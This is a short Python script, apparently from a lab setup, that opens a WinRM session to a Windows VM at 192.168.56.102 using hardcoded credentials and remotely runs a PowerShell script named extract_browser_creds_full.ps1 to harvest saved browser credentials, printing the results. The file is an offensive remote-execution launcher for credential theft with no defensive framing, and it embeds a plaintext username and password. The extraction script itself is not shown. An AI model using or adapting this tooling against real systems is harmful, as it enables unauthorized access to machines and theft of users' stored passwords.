#!/usr/bin/env python3
"""
Run Full Credential Extraction on Windows VM
Executes the advanced browser credential extraction script via WinRM
"""

import winrm

print("[*] Connecting to Windows VM (192.168.56.102)...")

# Create WinRM session
session = winrm.Session(
    'http://192.168.56.102:5985/wsman',
    auth=('akila', '12345678'),
    transport='ntlm'
)

print("[+] Connected successfully!")
print("[*] Reading credential extraction script...")

# Read the PowerShell script
with open('scripts/extract_browser_creds_full.ps1', 'r') as f:
    script = f.read()

print("[*] Executing credential extraction on Windows VM...")
print("="*70)

# Execute the script
result = session.run_ps(script)

# Display output
if result.status_code == 0:
    print(result.std_out.decode())
    print("="*70)
    print(f"[+] Extraction completed successfully!")
else:
    print("ERROR OUTPUT:")
    print(result.std_err.decode())
    print("="*70)
    print(f"[-] Extraction failed with exit code: {result.status_code}")

print(f"\n[*] Exit Code: {result.status_code}")
